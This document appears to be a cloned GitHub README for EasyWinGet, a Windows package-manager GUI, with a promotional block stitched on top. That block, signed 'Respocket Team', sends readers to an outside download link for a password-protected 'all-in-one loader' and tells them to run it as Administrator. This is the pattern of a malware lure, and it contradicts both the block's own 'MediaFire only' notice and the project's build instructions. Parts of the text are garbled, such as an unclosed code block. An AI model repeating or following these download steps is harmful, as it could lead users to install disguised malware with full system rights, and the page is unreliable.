<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# 🚀 EasyWinGet

<div align="center">

## 📖 Overview

**EasyWinGet** transforms the command-line Windows Package Manager (`winget`) into an elegant, responsive, and distraction-free Windows 11 desktop experience. 

Unlike heavy Electron-based wrappers that consume hundreds of megabytes of RAM, EasyWinGet is compiled directly into a native Windows binary using **Go** and **Wails v2** (leveraging native Microsoft Edge WebView2). It starts up in milliseconds, utilizes negligible system resources, and provides instant local caching via an embedded pure Go SQLite engine.

Whether you prefer a traditional **Windows Setup Wizard** with desktop shortcuts and taskbar pinning or a 100% self-contained **Portable Edition** that runs seamlessly off a USB thumb drive, EasyWinGet has you covered.

---

## ✨ Key Features

### ⚡ Pure Go Performance & Sub-Millisecond SQLite Caching
- **Zero Electron Overhead**: Consumes a tiny fraction of memory compared to web-wrapped tools.
- **Pure Go Embedded SQLite 3**: CGO-free local database running in WAL (Write-Ahead Logging) mode, providing instant package queries and offline catalog caching.
- **Single Instance Guard**: Prevents duplicate processes and automatically brings existing minimized or running windows to the foreground.

### 📦 Dual Distribution Modes
- **Setup Installer (`EasyWinGet-amd64-installer.exe`)**:
  - Full NSIS Setup Wizard with customizable scope (Machine or Current User).
  - Creates Desktop & Start Menu shortcuts, uninstaller entry in Windows Settings.
  - Includes automated Windows 10/11 taskbar pinning.
- **Portable Edition (`EasyWinGet-portable.zip`)**:
  - Completely self-contained! All database files, scraped app icons, job logs, and downloads are stored locally inside `data/`, `downloads/`, and `jobs/` alongside `EasyWinGet.exe`.
  - Zero registry trace, no `%LOCALAPPDATA%` pollution—ideal for system administrators and USB toolkits.

### 🔍 Instant Package Search & Discovery
- Fast search across tens of thousands of community WinGet manifests with smart debouncing.
- Categorized exploration (Development, Browsers, Media, Social, Utilities, Gaming, and Security).
- Instant chips and category filtering with clean keyboard navigation.

### 📦 Installed Applications & Deep Registry Scanner
- **Hybrid Package Discovery**: Combines official WinGet manifests with a high-speed BCUninstaller-style Win32 Registry scanner (both 64-bit and 32-bit `WOW6432Node`).
- Deep search filter with instant keyboard shortcuts (`Esc` to clear, smooth backspace handling, and guaranteed unique key rendering).
- One-click uninstallation with elevated UAC integration.
- **Import & Export**: Backup your installed applications list to JSON and restore them effortlessly on a new PC.

### 🔄 One-Click Updates Center
- Automated outdated package detection with visual version diffs (`v1.0.0 ➔ v1.2.0`).
- **Update All**: Upgrade all outdated applications in an automated queue.
- **Ignore Updates**: Hide updates for specific packages or custom builds you wish to freeze.
- **Background Update Checker**: Configurable background checks with native Windows notifications and automatic 24-hour reminder throttling.

### 🖥️ Real-Time Job Terminal & Background Dock
- Real-time goroutine log streaming via Wails event bus (`job:log`, `job:done`).
- Interactive console with stdin input support and one-click task cancellation.
- Minimizes into a discreet floating status bar when browsing other tabs during active operations.

### 💾 Offline Downloads Manager
- Download installers (`.exe`, `.msi`, `.msix`) directly to local storage without executing them.
- Ideal for offline deployment, archival, and distribution.

### 🚀 Integrated App Self-Update
- Automatically checks GitHub Releases on startup.
- Displays a clean Fluent 2 modal with release notes, "Update Now", and a once-per-day "Remind Me Later" option.

### 🎨 Windows 11 Fluent 2 Aesthetics
- Native Win32 DWM **Mica translucency** and acrylic material effects.
- Dynamic auto-luminance color calculations matching your Windows personalization accent color.
- Three-way theme toggle: Light, Dark, or System Auto.

---

## 🛠️ Building From Source

### Prerequisites
1. **Operating System**: Windows 10 (Build 1809+) or Windows 11 (64-bit).
### Clone Repository
```powershell
### Live-Reload Development Mode
Runs the application with hot-reloading for both Go backend and Svelte frontend:
```powershell
wails dev
```

### Build Standalone Executable
Compiles the production executable into `build/bin/EasyWinGet.exe`:
```powershell
wails build
```

### Build Full Setup Installer (.exe)
Generates `build/bin/EasyWinGet-amd64-installer.exe`:
```powershell
powershell -ExecutionPolicy Bypass -File scripts/build_installer.ps1
```

For a non-elevated user-scope installer:
```powershell
powershell -ExecutionPolicy Bypass -File scripts/build_installer.ps1 -Scope user
```

### Build Portable Edition (.zip)
Generates `build/bin/EasyWinGet-portable.zip`:
```powershell
powershell -ExecutionPolicy Bypass -File scripts/build_portable.ps1
```

---

## 🏗️ Architecture & Project Structure

```
EasyWinGet/
├── .github/
│   └── workflows/
│       ├── build.yml         # Continuous integration & test workflow
│       └── release.yml       # Automated tag release & asset publisher
├── backend/                  # Pure Go Backend Services
│   ├── db/                   # High-speed SQLite 3 database (WAL mode)
│   ├── downloads/            # Offline installer file manager
│   ├── icons/                # Local PE icon extraction & Google S2 favicons
│   ├── installed/            # Native Windows Registry package scanner
│   ├── jobs/                 # Real-time goroutine job runner & stream broadcaster
│   ├── models/               # Shared data structures
│   ├── system/               # Windows accent color, Mica, paths & portable resolver
│   └── winget/               # Windows Package Manager CLI parser & wrapper
├── frontend/                 # Svelte 5 + Vite Modern UI
│   ├── src/
│   │   ├── components/       # Fluent 2 modular components
│   │   ├── utils/            # Accent color luminance & icon resolvers
│   │   ├── App.svelte        # Root coordinator & modal manager
│   │   ├── main.js           # Frontend entry point
│   │   └── style.css         # Windows 11 design tokens & styles
│   └── wailsjs/              # Auto-generated Go-to-JS bridge bindings
├── build/
│   └── windows/
│       └── installer/        # NSIS installer script & taskbar pinning script
├── scripts/                  # Automated build & packaging scripts
├── app.go                    # Wails runtime bridge & API surface
├── main.go                   # Window entry point, Mica backdrop, single instance lock
├── wails.json                # Wails v2 project configuration
└── go.mod                    # Go module definitions
```

---

## 🔒 Security & Privacy

- **Open Source & Transparent**: All code is open-source under the MIT license with zero telemetry or tracking.
- **Native Execution**: WinGet operations are executed directly against the local Microsoft Windows Package Manager CLI.
- **Safe Persistence**:
  - In Installed Mode, data is isolated to `%LOCALAPPDATA%\EasyWinGet\`.
  - In Portable Mode, data is strictly isolated to the application folder.
- **Cryptographic Verification**: Every release includes SHA-256 checksums to verify binary integrity.

---

## 🤝 Contributing

Contributions, feature suggestions, and bug reports are welcome!
1. Fork the repository.
2. Create your feature branch (`git checkout -b feature/amazing-feature`).
3. Commit your changes (`git commit -m 'feat: add amazing feature'`).
4. Push to the branch (`git push origin feature/amazing-feature`).
5. Open a Pull Request.

---


---

MIT License

Copyright (c) 2025 Jyoti Karmakar

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
